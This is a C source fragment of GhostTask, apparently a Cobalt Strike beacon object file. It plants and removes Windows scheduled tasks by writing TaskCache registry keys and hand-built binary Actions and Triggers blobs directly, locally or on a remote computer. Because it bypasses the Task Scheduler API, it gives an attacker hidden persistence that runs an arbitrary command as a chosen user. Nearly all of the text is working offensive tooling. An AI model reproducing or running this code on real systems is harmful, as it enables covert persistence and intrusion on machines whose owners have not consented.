    REG_ERROR_CODE regRetCode = OpenKeyHandle(&hHiveRoot, computerName, KEY_CREATE_SUB_KEY, NULL);
    if (regRetCode != REG_SUCCESS)
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to get key handle for HKLM.");
        return OPEN_KEY_FAIL;
    }
    HKEY hNewKey;
    DWORD dwDisposition;
    LSTATUS lret = RegCreateKeyExA(hHiveRoot, keyName, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hNewKey, &dwDisposition);

    if (hHiveRoot != HKEY_LOCAL_MACHINE) // Close it properly if it's a handle to a remote computer
        RegCloseKey(hHiveRoot);

    if (lret != ERROR_SUCCESS)
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to create key '%s%s%s%s%s' [error %d].", computerString, computerNameSeparator, hiveRootString, rootSeparator, keyName, lret);
        return ADD_KEY_FAIL;
    }

    RegCloseKey(hNewKey);

    if (dwDisposition == REG_OPENED_EXISTING_KEY)
    {
        BeaconPrintf(CALLBACK_ERROR, "Identified existing key '%s%s%s%s%s'.", computerString, computerNameSeparator, hiveRootString, rootSeparator, keyName);
        return REG_SUCCESS;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Created key '%s%s%s%s%s'.", computerString, computerNameSeparator, hiveRootString, rootSeparator, keyName);
    return REG_SUCCESS;
}

BOOL AddValue(HKEY hKey, LPCSTR computerName, LPCSTR keyName, LPCSTR valueName, DWORD dwRegType, DWORD dataLength, LPBYTE bdata, bool overwrite)
{
    const char *hiveRootString = "HKLM";
    const char *rootSeparator = (strlen(keyName) == 0) ? "" : "\\";
    const char *computerString = computerName == NULL ? "" : computerName;
    const char *computerNameSeparator = computerName == NULL ? "" : "\\";

    LSTATUS lret = RegQueryValueExA(hKey, valueName, NULL, NULL, NULL, NULL);

    const char *successOperationString = (lret == ERROR_SUCCESS) ? "Overwrote" : "Added";
    const char *failOperationString = (lret == ERROR_SUCCESS) ? "overwrite" : "add";
    const char *preposition = (lret == ERROR_SUCCESS) ? "in" : "to";

    if (lret == ERROR_SUCCESS && !overwrite)
        return TRUE;
    lret = RegSetValueExA(hKey, valueName, 0, dwRegType, bdata, dataLength);

    if (lret != ERROR_SUCCESS)
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to %s value '%s' %s '%s%s%s%s%s' [error %d].", failOperationString, valueName, preposition, computerString, computerNameSeparator, hiveRootString, rootSeparator, keyName, lret);
        return FALSE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "%s value '%s' %s '%s%s%s%s%s'", successOperationString, valueName, preposition, computerString, computerNameSeparator, hiveRootString, rootSeparator, keyName);
    return TRUE;
}

BOOL AddScheduleTask(LPCSTR computerName, LPCSTR taskName, LPCSTR cmd, LPCSTR argument, LPCSTR userName, unsigned short scheduleType, int hour, int minute, int second, unsigned short dayBitmap)
{
    if (!GhostTaskHasSafeTaskName(taskName))
    {
        BeaconPrintf(CALLBACK_ERROR, "Task name must be a safe 1-190 byte registry path.");
        return FALSE;
    }

    unsigned char author[] = {0x41, 0x00, 0x75, 0x00, 0x74, 0x00, 0x68, 0x00, 0x6f, 0x00, 0x72, 0x00};
    char *taskPath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\";
    char *tree = "Tree\\";
    char *plain = "Plain\\";
    char *task = "Tasks\\";
    int taskNameSize = strlen(taskName);
    int taskPathSize = strlen(taskPath);
    int plainSize = strlen(plain);
    int taskSize = strlen(task);
    int treeSize = strlen(tree);
    int sizeOfAuthor = sizeof(author) / sizeof(author[0]);
    char *uriPath = (char *)malloc(taskNameSize + 2);
    char *treeKey = (char *)malloc(taskPathSize + treeSize + taskNameSize + 1);
    char *plainKey = NULL, *taskKey = NULL, *fullGuid = NULL, *productName = NULL;
    PSID targetSid = NULL;
    DWORD domainSize = 0, sizeOfSid = 0;
    LPSTR domainName = NULL;
    bool userFound = false, legacyActionVersion = false;
    SID_NAME_USE peUse = SidTypeUnknown;
    FILETIME emptyTime = {0};
    AlignedByte empty = {0};
    TSTIME emptyTstime = {0};
    OSVERSIONINFOEXA winVer = {0};
    FILETIME ft = {0};
    SYSTEMTIME st = {0};
    char dateString[20] = {0};
    LPCSTR workingDirectory = "";
    LONGLONG index = 3;
    wchar_t cmd_w[256] = {0};
    wchar_t argument_w[256] = {0};
    wchar_t workingDirectory_w[256] = {0};
    int sizeOfCmd = strlen(cmd);
    int sizeOfArgument = strlen(argument);
    int sizeOfWorkingDirectory = strlen(workingDirectory);
    int cmdWideChars = 0;
    int argumentWideChars = 0;
    int workingDirectoryWideChars = 0;
    DWORD totalActionSize = 0;
    Actions *action = (Actions *)malloc(sizeof(Actions));
    BYTE *actionRaw = NULL;
    DynamicInfo dynamicInfo = {0};
    SYSTEMTIME startBoundary = {0};
    FILETIME ftStartBoundary = {0};
    TSTIME tsStartBoundary = {0};
    PSECURITY_DESCRIPTOR pSd = NULL;
    ULONG sdLength = 0;
    HKEY hKeyTree = NULL;
    HKEY hKeyTask = NULL;
    Header header = {0};
    Trigger12 *trigger12 = NULL;
    Trigger28 *trigger28 = NULL;
    JobBucket12 jobBucket12 = {0};
    UserInfo12 userInfo12 = {0};
    JobBucket28 jobBucket28 = {0};
    UserInfo28 userInfo28 = {0};
    OptionalSettings optionalSettings = {0};
    TimeTrigger timeTrigger = {0};
    LogonTrigger logonTrigger = {0};
    AlignedByte version = {0}, localized = {0}, skipUser = {0}, skipSid = {0}, enable = {0};
    BOOL success = FALSE;

    if (uriPath == NULL || treeKey == NULL || action == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "Memory allocation failed.");
        goto exit;
    }

    empty.value = 0;
    memset(empty.padding, 0, 7);
    emptyTime.dwLowDateTime = 0;
    emptyTime.dwHighDateTime = 0;
    emptyTstime.isLocalized = empty;
    emptyTstime.time = emptyTime;
    cmdWideChars = MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, cmd, -1, NULL, 0);
    argumentWideChars = MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, argument, -1, NULL, 0);
    workingDirectoryWideChars = MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, workingDirectory, -1, NULL, 0);
    if (cmdWideChars <= 0 || cmdWideChars > 256 ||
        argumentWideChars <= 0 || argumentWideChars > 256 ||
        workingDirectoryWideChars <= 0 || workingDirectoryWideChars > 256 ||
        MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, cmd, -1, cmd_w, 256) != cmdWideChars ||
        MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, argument, -1, argument_w, 256) != argumentWideChars ||
        MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, workingDirectory, -1, workingDirectory_w, 256) != workingDirectoryWideChars)
    {
        BeaconPrintf(CALLBACK_ERROR, "Task action contains invalid UTF-8 or exceeds 255 UTF-16 characters.");
        goto exit;
    }
    sizeOfCmd = (cmdWideChars - 1) * sizeof(wchar_t);
    sizeOfArgument = (argumentWideChars - 1) * sizeof(wchar_t);
    sizeOfWorkingDirectory = (workingDirectoryWideChars - 1) * sizeof(wchar_t);
    startBoundary.wYear = 1992;
    startBoundary.wMonth = 5;
    startBoundary.wDay = 1;
    startBoundary.wHour = hour;
    startBoundary.wMinute = minute;
    startBoundary.wSecond = 0;
    startBoundary.wMilliseconds = 0;
    SystemTimeToFileTime(&startBoundary, &ftStartBoundary);
    localized.value = 1;
    memset(localized.padding, 0, 7);
    tsStartBoundary.isLocalized = localized;
    tsStartBoundary.time = ftStartBoundary;

    // Construct schedule task path
    sprintf(treeKey, "%s%s%s", taskPath, tree, taskName);
    sprintf(uriPath, "\\%s", taskName);

    // Get Windows version
    memset(&winVer, 0, sizeof(OSVERSIONINFOEXA));
    winVer.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
    productName = GetProductName(computerName);
    if (productName == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "Unable to obtain the product name of the target system (%s).", computerName);
        goto exit;
    }
    if (my_strstr(productName, "2016"))
        legacyActionVersion = TRUE;

    userFound = LookupAccountNameA(NULL, userName, targetSid, &sizeOfSid, domainName, &domainSize, &peUse);
    if (!userFound && GetLastError() == ERROR_INSUFFICIENT_BUFFER)
    {
        targetSid = (PSID)malloc(sizeOfSid);
        domainName = (LPSTR)malloc(domainSize * sizeof(CHAR) + 1);
        if (!targetSid || !domainName)
        {
            BeaconPrintf(CALLBACK_ERROR, "Memory allocation failed.");
            goto exit;
        }

        userFound = LookupAccountNameA(NULL, userName, targetSid, &sizeOfSid, domainName, &domainSize, &peUse);
        free(domainName);
        domainName = NULL;
    }

    if (!userFound)
    {
        BeaconPrintf(CALLBACK_ERROR, "Target user not found. Error code: 0x%x", GetLastError());
        goto exit;
    }
    if (!GhostTaskHasSupportedSidSize(sizeOfSid))
    {
        BeaconPrintf(CALLBACK_ERROR, "Unsupported SID size %lu; GhostTask supports only 12-byte and 28-byte serialized layouts.", sizeOfSid);
        goto exit;
    }

    // Get existing GUID or generate a new one only when the task tree is absent.
    TASK_GUID_RESULT guidResult = GetExistingTaskGuid(computerName, taskName, &fullGuid);
    if (guidResult == TaskGuidInvalid)
    {
        BeaconPrintf(CALLBACK_ERROR, "Existing task metadata is inaccessible or malformed.");
        goto exit;
    }
    if (guidResult == TaskGuidAbsent)
    {
        GUID uuid = {0};
        RPC_CSTR szRPCGuid = NULL;
        if (UuidCreate(&uuid) == RPC_S_OK && UuidToStringA(&uuid, &szRPCGuid) == RPC_S_OK && szRPCGuid)
        {
            fullGuid = (char *)malloc(GUIDSIZE + 1);
            if (fullGuid == NULL)
            {
                RpcStringFreeA(&szRPCGuid);
                BeaconPrintf(CALLBACK_ERROR, "Memory allocation failed.");
                goto exit;
            }
            sprintf(fullGuid, "{%s}", szRPCGuid);
            RpcStringFreeA(&szRPCGuid);
            _strupr(fullGuid);
        }
        else
        {
            BeaconPrintf(CALLBACK_ERROR, "GUID cannot be generated.");
            goto exit;
        }
    }

    // Update GUID path
    plainKey = (char *)malloc(taskPathSize + plainSize + GUIDSIZE + 1);
    taskKey = (char *)malloc(taskPathSize + taskSize + GUIDSIZE + 1);
    if (plainKey == NULL || taskKey == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "Memory allocation failed.");
        goto exit;
    }
    sprintf(plainKey, "%s%s%s", taskPath, plain, fullGuid);
    sprintf(taskKey, "%s%s%s", taskPath, task, fullGuid);

    // Initialize Actions
    action->version = legacyActionVersion ? 0x2 : 0x3;
    action->sizeOfAuthor = sizeOfAuthor;
    memcpy(action->author, author, action->sizeOfAuthor);
    action->magic = 0x6666;
    action->id = 0;
    action->sizeOfCmd = sizeOfCmd;
    action->cmd = cmd_w;
    action->sizeOfArgument = sizeOfArgument;
    action->argument = argument_w;
    action->sizeOfWorkingDirectory = sizeOfWorkingDirectory;
    action->workingDirectory = workingDirectory_w;
    action->flags = 0;

    totalActionSize = sizeof(short) + sizeof(DWORD) + sizeOfAuthor + sizeof(short) + sizeof(DWORD) + sizeof(DWORD) + sizeOfCmd + sizeof(DWORD) + sizeOfArgument + sizeof(DWORD) + sizeOfWorkingDirectory + sizeof(short);
    actionRaw = (BYTE *)malloc(totalActionSize);
    if (actionRaw == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "Memory allocation failed.");
        goto exit;
    }
    BYTE *ptr = actionRaw;
    COPY_DATA(ptr, &action->version, sizeof(short));
    COPY_DATA(ptr, &action->sizeOfAuthor, sizeof(DWORD));
    COPY_DATA(ptr, action->author, action->sizeOfAuthor);
    COPY_DATA(ptr, &action->magic, sizeof(short));
    COPY_DATA(ptr, &action->id, sizeof(DWORD));
    COPY_DATA(ptr, &action->sizeOfCmd, sizeof(DWORD));
    COPY_DATA(ptr, action->cmd, sizeOfCmd);
    COPY_DATA(ptr, &action->sizeOfArgument, sizeof(DWORD));
    COPY_DATA(ptr, action->argument, sizeOfArgument);
    COPY_DATA(ptr, &action->sizeOfWorkingDirectory, sizeof(DWORD));
    COPY_DATA(ptr, action->workingDirectory, sizeOfWorkingDirectory);
    COPY_DATA(ptr, &action->flags, sizeof(short));

    // Initialize DynamicInfo
    GetLocalTime(&st);
    SystemTimeToFileTime(&st, &ft);
    dynamicInfo.magic = 0x3;
    dynamicInfo.ftCreate = ft;
    // Will be displayed in "Last Run Time" in taskschd.msc
    dynamicInfo.ftLastRun = emptyTime;
    dynamicInfo.dwTaskState = 0;
    // Will be displayed in "Last Run Result" in taskschd.msc
    dynamicInfo.dwLastErrorCode = 0;
    dynamicInfo.ftLastSuccessfulRun = emptyTime;

    // Initialize Date
    sprintf(dateString, "%04d-%02d-%02dT%02d:%02d:%02d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);

    // Initialize UserInfo
    skipUser.value = 0;
    skipSid.value = 0;
    memset(skipUser.padding, 0x48, 7);
    memset(skipSid.padding, 0x48, 7);
    if (sizeOfSid == 12)
    {
        userInfo12.skipUser = skipUser;
        userInfo12.skipSid = skipSid;
        userInfo12.sidType = 0x1;
        userInfo12.pad0 = 0x48484848;
        userInfo12.sizeOfSid = sizeOfSid;
        userInfo12.pad1 = 0x48484848;
        memcpy(userInfo12.sid, targetSid, sizeOfSid);
        userInfo12.pad2 = 0x48484848;
        userInfo12.sizeOfUsername = 0;
        userInfo12.pad3 = 0x48484848;
    }
    else
    {
        userInfo28.skipUser = skipUser;
        userInfo28.skipSid = skipSid;
        userInfo28.sidType = 0x1;
        userInfo28.pad0 = 0x48484848;
        userInfo28.sizeOfSid = sizeOfSid;
        userInfo28.pad1 = 0x48484848;
        memcpy(userInfo28.sid, targetSid, sizeOfSid);
        userInfo28.pad2 = 0x48484848;
        userInfo28.sizeOfUsername = 0;
        userInfo28.pad3 = 0x48484848;
    }

    // Initialize OptionalSettings
    // Default value 10 minutes
    optionalSettings.idleDurationSeconds = 0x258;
    // Default value 1 hour
    optionalSettings.idleWaitTimeoutSeconds = 0xe10;
    // Default value 3 days
    optionalSettings.executionTimeLimitSeconds = 0x3f480;
    optionalSettings.deleteExpiredTaskAfter = 0xffffffff;
    // Default value is 7 BELOW_NORMAL_PRIORITY_CLASS
    optionalSettings.priority = 0x7;
    optionalSettings.restartOnFailureDelay = 0;
    optionalSettings.restartOnFailureRetries = 0;
    GUID emptyNetworkId;
    memset(&emptyNetworkId, 0, sizeof(GUID));
    optionalSettings.networkId = emptyNetworkId;
    optionalSettings.pad0 = 0x48484848;

    // Initialize Header
    version.value = 0x17;
    memset(version.padding, 0, 7);
    header.version = version;

    // Initialize Trigger
    if (scheduleType == 3)
    {
        trigger12 = (Trigger12 *)malloc(sizeof(Trigger12) + sizeof(LogonTrigger));
        trigger28 = (Trigger28 *)malloc(sizeof(Trigger28) + sizeof(LogonTrigger));
        if (trigger12 == NULL || trigger28 == NULL)
        {
            BeaconPrintf(CALLBACK_ERROR, "Memory allocation failed.");
            goto exit;
        }
        logonTrigger.magic = 0xaaaa;
        logonTrigger.unknown0 = 0;
        logonTrigger.startBoundary = emptyTstime;
        logonTrigger.endBoundary = emptyTstime;
        logonTrigger.delaySeconds = 0;
        logonTrigger.timeoutSeconds = 0xffffffff;
        logonTrigger.repetitionIntervalSeconds = 0;
        logonTrigger.repetitionDurationSeconds = 0;
        logonTrigger.repetitionDurationSeconds2 = 0;
        logonTrigger.stopAtDurationEnd = 0;
        enable.value = 1;
        memset(enable.padding, 0, 7);
        logonTrigger.enabled = enable;
        logonTrigger.unknown1 = empty;
        logonTrigger.triggerId = 0;
        logonTrigger.blockPadding = 0x48484848;
        skipUser.value = 1;
        logonTrigger.skipUser = skipUser;
    }
    else
    {
        trigger12 = (Trigger12 *)malloc(sizeof(Trigger12) + sizeof(TimeTrigger));
        trigger28 = (Trigger28 *)malloc(sizeof(Trigger28) + sizeof(TimeTrigger));
        if (trigger12 == NULL || trigger28 == NULL)
        {
            BeaconPrintf(CALLBACK_ERROR, "Memory allocation failed.");
            goto exit;
        }
        timeTrigger.magic = 0xdddd;
        timeTrigger.unknown0 = 0;
        timeTrigger.endBoundary = emptyTstime;
        timeTrigger.unknown1 = emptyTstime;
        if (scheduleType == 0)
        {
            tsStartBoundary.time = ft;
            timeTrigger.repetitionIntervalSeconds = second;
        }
        else
            timeTrigger.repetitionIntervalSeconds = 0;
        timeTrigger.startBoundary = tsStartBoundary;
        timeTrigger.repetitionDurationSeconds = 0;
        timeTrigger.timeoutSeconds = 0xffffffff;
        // Schedule type 0: secondly
        if (scheduleType == 0)
        {
            timeTrigger.mode = 0;
            timeTrigger.data1 = 0;
            // Schedule type 1: daily
        }
        else if (scheduleType == 1)
        {
            timeTrigger.mode = 1;
            timeTrigger.data1 = 0;
            // Schedule type 2: weekly
        }
        else if (scheduleType == 2)
        {
            timeTrigger.mode = 2;
            timeTrigger.data1 = dayBitmap;
        }
        timeTrigger.data0 = 1;
        timeTrigger.data2 = 0;
        timeTrigger.pad0 = 0;
        timeTrigger.stopTasksAtDurationEnd = 0;
        timeTrigger.enabled = 1;
        timeTrigger.pad1 = 0;
        timeTrigger.unknown2 = 1;
        timeTrigger.maxDelaySeconds = 0;
        timeTrigger.pad2 = 0;
        timeTrigger.triggerId = 0x4848484800000000;
    }

    header.endBoundary = emptyTstime;
    if (scheduleType == 3)
        header.startBoundary = emptyTstime;
    else
        header.startBoundary = timeTrigger.startBoundary;

    if (sizeOfSid == 12)
    {
        // 0x40000000: allow_hard_terminate
        // 0x2000000: task
        // 0x400000: enabled
        // 0x10000: logon_type_interactivetoken
        // 0x2000: execute_ignore_new
        // 0x100: allow_start_on_demand
        // 0x8: stop_on_idle_end
        jobBucket12.flags = 0x42412108;
        jobBucket12.pad0 = 0x48484848;
        jobBucket12.crc32 = 0;
        jobBucket12.pad1 = 0x48484848;
        jobBucket12.sizeOfAuthor = 0xe;
        jobBucket12.pad2 = 0x48484848;
        memcpy(jobBucket12.author, author, 12);
        jobBucket12.pad3 = 0x48480000;
        jobBucket12.displayName = 0;
        jobBucket12.pad4 = 0x48484848;
        jobBucket12.userInfo = userInfo12;
        jobBucket12.sizeOfOptionalSettings = 0x2c;
        jobBucket12.pad5 = 0x48484848;
        jobBucket12.optionalSettings = optionalSettings;

        trigger12->header = header;
        trigger12->jobBucket = jobBucket12;
        if (scheduleType == 3)
            memcpy(trigger12->trigger, &logonTrigger, sizeof(LogonTrigger));
        else
            memcpy(trigger12->trigger, &timeTrigger, sizeof(TimeTrigger));
    }
    else
    {
        // 0x40000000: allow_hard_terminate
        // 0x2000000: task
        // 0x400000: enabled
        // 0x10000: logon_type_interactivetoken
        // 0x2000: execute_ignore_new
        // 0x100: allow_start_on_demand
        // 0x8: stop_on_idle_end
        jobBucket28.flags = 0x42412108;
        jobBucket28.pad0 = 0x48484848;
        jobBucket28.crc32 = 0;
        jobBucket28.pad1 = 0x48484848;
        jobBucket28.sizeOfAuthor = 0xe;
        jobBucket28.pad2 = 0x48484848;
        memcpy(jobBucket28.author, author, 12);
        jobBucket28.pad3 = 0x48480000;
        jobBucket28.displayName = 0;
        jobBucket28.pad4 = 0x48484848;
        jobBucket28.userInfo = userInfo28;
        jobBucket28.sizeOfOptionalSettings = 0x2c;
        jobBucket28.pad5 = 0x48484848;
        jobBucket28.optionalSettings = optionalSettings;

        trigger28->header = header;
        trigger28->jobBucket = jobBucket28;
        if (scheduleType == 3)
            memcpy(trigger28->trigger, &logonTrigger, sizeof(LogonTrigger));
        else
            memcpy(trigger28->trigger, &timeTrigger, sizeof(TimeTrigger));
    }

    // Initialize security descriptor
#ifdef BOF
    ConvertStringSecurityDescriptorToSecurityDescriptorA_t convertSecurityDescriptor = ConvertStringSecurityDescriptorToSecurityDescriptorA;
    if (convertSecurityDescriptor == NULL ||
        !convertSecurityDescriptor("O:BAG:SYD:", 1, &pSd, &sdLength))
#else
    if (!ConvertStringSecurityDescriptorToSecurityDescriptorA("O:BAG:SYD:", 1, &pSd, &sdLength))
#endif
    {
        BeaconPrintf(CALLBACK_ERROR, "Unable to create the scheduled-task security descriptor. Error code: 0x%x", GetLastError());
        goto exit;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Execution Log:\n");
    // Create scheduled task subkey
    REG_ERROR_CODE regRetCode = AddKey(computerName, plainKey);
    if (regRetCode != REG_SUCCESS)
        goto exit;
    regRetCode = AddKey(computerName, treeKey);
    if (regRetCode != REG_SUCCESS)
        goto exit;
    regRetCode = AddKey(computerName, taskKey);
    if (regRetCode != REG_SUCCESS)
        goto exit;

    hKeyTree = NULL;
    REG_ERROR_CODE treeRegRetCode = OpenKeyHandle(&hKeyTree, computerName, KEY_QUERY_VALUE | KEY_SET_VALUE, treeKey);
    hKeyTask = NULL;
    REG_ERROR_CODE taskRegRetCode = OpenKeyHandle(&hKeyTask, computerName, KEY_QUERY_VALUE | KEY_SET_VALUE, taskKey);

    if (treeRegRetCode != REG_SUCCESS || taskRegRetCode != REG_SUCCESS)
    {
        BeaconPrintf(CALLBACK_ERROR, "Unable to obtain scheduled task key handle.");
        goto exit;
    }

    // Add values for task tree
    if (!AddValue(hKeyTree, computerName, treeKey, "Index", 0x4, 4, (LPBYTE)&index, false) ||
        !AddValue(hKeyTree, computerName, treeKey, "Id", 0x1, strlen(fullGuid) + 1, (LPBYTE)fullGuid, false) ||
        !AddValue(hKeyTree, computerName, treeKey, "SD", REG_BINARY, sdLength, (LPBYTE)pSd, false))
        goto exit;

    // Add values for Task GUID
    if (!AddValue(hKeyTask, computerName, taskKey, "Author", 0x1, strlen(userName) + 1, (char *)userName, false) ||
        !AddValue(hKeyTask, computerName, taskKey, "Path", 0x1, strlen(uriPath) + 1, (char *)uriPath, false) ||
        !AddValue(hKeyTask, computerName, taskKey, "URI", 0x1, strlen(uriPath) + 1, (char *)uriPath, false) ||
        !AddValue(hKeyTask, computerName, taskKey, "Date", 0x1, strlen(dateString) + 1, (char *)dateString, false))
        goto exit;

    if (legacyActionVersion)
    {
        if (!AddValue(hKeyTask, computerName, taskKey, "Actions", REG_BINARY, totalActionSize - 2, (LPBYTE)actionRaw, true))
            goto exit;
    }
    else
    {
        if (!AddValue(hKeyTask, computerName, taskKey, "Actions", REG_BINARY, totalActionSize, (LPBYTE)actionRaw, true))
            goto exit;
    }

    if (!AddValue(hKeyTask, computerName, taskKey, "DynamicInfo", REG_BINARY, sizeof(DynamicInfo), (LPBYTE)&dynamicInfo, false))
        goto exit;
    if (sizeOfSid == 12)
    {
        if (scheduleType == 3)
        {
            if (!AddValue(hKeyTask, computerName, taskKey, "Triggers", REG_BINARY, sizeof(Trigger12) + sizeof(LogonTrigger), (LPBYTE)trigger12, true))
                goto exit;
        }
        else
        {
            if (!AddValue(hKeyTask, computerName, taskKey, "Triggers", REG_BINARY, sizeof(Trigger12) + sizeof(TimeTrigger), (LPBYTE)trigger12, true))
                goto exit;
        }
    }
    else
    {
        if (scheduleType == 3)
        {
            if (!AddValue(hKeyTask, computerName, taskKey, "Triggers", REG_BINARY, sizeof(Trigger28) + sizeof(LogonTrigger), (LPBYTE)trigger28, true))
                goto exit;
        }
        else
        {
            if (!AddValue(hKeyTask, computerName, taskKey, "Triggers", REG_BINARY, sizeof(Trigger28) + sizeof(TimeTrigger), (LPBYTE)trigger28, true))
                goto exit;
        }
    }

    success = TRUE;
    BeaconPrintf(CALLBACK_OUTPUT, "Scheduled task has been created with the following setup:");
    if (computerName != NULL)
        BeaconPrintf(CALLBACK_OUTPUT, "%-30s %s", "Target Computer Name:", computerName);
    BeaconPrintf(CALLBACK_OUTPUT, "%-30s %s", "Task Name:", taskName);
    BeaconPrintf(CALLBACK_OUTPUT, "%-30s %s", "Task GUID:", fullGuid);
    BeaconPrintf(CALLBACK_OUTPUT, "%-30s %s", "User to execute the task:", userName);
    BeaconPrintf(CALLBACK_OUTPUT, "%-30s %s %s", "Action:", cmd, argument);
    if (scheduleType == 0)
    {
        BeaconPrintf(CALLBACK_OUTPUT, "%-30s second", "Schedule Type:");
        BeaconPrintf(CALLBACK_OUTPUT, "%-30s every %d seconds", "Execution Time:", second);
    }
    else if (scheduleType == 1)
    {
        BeaconPrintf(CALLBACK_OUTPUT, "%-30s daily", "Schedule Type:");
        BeaconPrintf(CALLBACK_OUTPUT, "%-30s %02d:%02d", "Execution Time:", hour, minute);
    }
    else if (scheduleType == 2)
    {
        BeaconPrintf(CALLBACK_OUTPUT, "%-30s weekly", "Schedule Type:");
        BeaconPrintf(CALLBACK_OUTPUT, "%-30s %02d:%02d", "Execution Time:", hour, minute);
    }
    else if (scheduleType == 3)
        BeaconPrintf(CALLBACK_OUTPUT, "%-30s logon", "Schedule Type:");

    if (computerName == NULL)
        BeaconPrintf(CALLBACK_OUTPUT, "%-30s GhostTask.exe localhost delete \"%s\"", "Task Deletion Command:", taskName);
    else
        BeaconPrintf(CALLBACK_OUTPUT, "%-30s GhostTask.exe %s delete \"%s\"", "Task Deletion Command:", computerName, taskName);

exit:
    if (hKeyTree != NULL)
        RegCloseKey(hKeyTree);
    if (hKeyTask != NULL)
        RegCloseKey(hKeyTask);
    if (pSd != NULL)
        KERNEL32$LocalFree(pSd);
    free(actionRaw);
    free(action);
    free(uriPath);
    free(treeKey);
    free(plainKey);
    free(taskKey);
    free(fullGuid);
    free(productName);
    free(targetSid);
    free(domainName);
    free(trigger12);
    free(trigger28);
    return success;
}

/* ---------------------------------------------------------------------------Add func end--------------------------------------------------------------------------------------------------------------------------------*/

/* ---------------------------------------------------------------------------Del func start--------------------------------------------------------------------------------------------------------------------------------*/

REG_ERROR_CODE DeleteKey(LPCSTR computerName, LPCSTR keyName)
{
    bool deleteFromRoot = false;
    DWORD lastSlashOffset = 0;
    const char *lastSlash = my_strrchr((const char *)keyName, '\\');

    if (lastSlash == NULL)
        deleteFromRoot = true;
    else
        lastSlashOffset = (DWORD)(lastSlash - keyName);

    char ParentKeyName[256];
    char ChildKeyName[256];
    if (deleteFromRoot)
    {
        ParentKeyName[0] = 0;
        my_strncpy_s(ChildKeyName, 256, keyName, strlen(keyName));
    }
    else
    {
        my_strncpy_s(ParentKeyName, 256, keyName, lastSlashOffset);
        my_strncpy_s(ChildKeyName, 256, lastSlash + 1, strlen(keyName) - lastSlashOffset - 1);
    }

    HKEY hParentKey = NULL;
    REG_ERROR_CODE regRetCode = OpenKeyHandle(&hParentKey, computerName, DELETE | KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE, ParentKeyName);
    if (regRetCode != REG_SUCCESS)
        return regRetCode;

    const char *hiveRootString = "HKLM";
    const char *rootSeparator = (strlen(keyName) == 0) ? "" : "\\";
    const char *computerString = computerName == NULL ? "" : computerName;
    const char *computerNameSeparator = computerName == NULL ? "" : "\\";

    LSTATUS lret = RegDeleteTreeA(hParentKey, ChildKeyName);

    RegCloseKey(hParentKey);

    if (lret != ERROR_SUCCESS)
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to delete key '%s%s%s%s%s' [error %d].\n", computerString, computerNameSeparator, hiveRootString, rootSeparator, keyName, lret);
        return DEL_KEY_FAIL;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "Deleted key '%s%s%s%s%s'.", computerString, computerNameSeparator, hiveRootString, rootSeparator, keyName);
    return REG_SUCCESS;
}

BOOL DeleteScheduleTask(LPCSTR computerName, LPCSTR taskName)
{
    char *plain = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Plain\\";
    char *task = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\\";
    char *tree = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\";
    char treeKey[MAX_PATH];
    char *fullGuid = NULL;
    BOOL success = FALSE;

    if (!GhostTaskHasSafeTaskName(taskName))
    {
        BeaconPrintf(CALLBACK_ERROR, "Task name must be a safe 1-190 byte registry path.");
        return FALSE;
    }

    sprintf(treeKey, "%s%s", tree, taskName);
    TASK_GUID_RESULT guidResult = GetExistingTaskGuid(computerName, taskName, &fullGuid);
    if (guidResult == TaskGuidAbsent)
    {
        BeaconPrintf(CALLBACK_ERROR, "The scheduled task does not exist.");
        goto delete_exit;
    }
    if (guidResult != TaskGuidFound || fullGuid == NULL)
    {
        BeaconPrintf(CALLBACK_ERROR, "Existing task metadata is inaccessible or malformed; refusing partial deletion.");
        goto delete_exit;
    }

    char plainKey[MAX_PATH];
    char taskKey[MAX_PATH];
    sprintf(plainKey, "%s%s", plain, fullGuid);
    sprintf(taskKey, "%s%s", task, fullGuid);
    if (DeleteKey(computerName, treeKey) != REG_SUCCESS ||
        DeleteKey(computerName, plainKey) != REG_SUCCESS ||
        DeleteKey(computerName, taskKey) != REG_SUCCESS)
        goto delete_exit;

    success = TRUE;
    BeaconPrintf(CALLBACK_OUTPUT, "Successfully deleted scheduled task (%s).\n", taskName);

delete_exit:
    free(fullGuid);
    return success;
}

/* ---------------------------------------------------------------------------Del func end--------------------------------------------------------------------------------------------------------------------------------*/
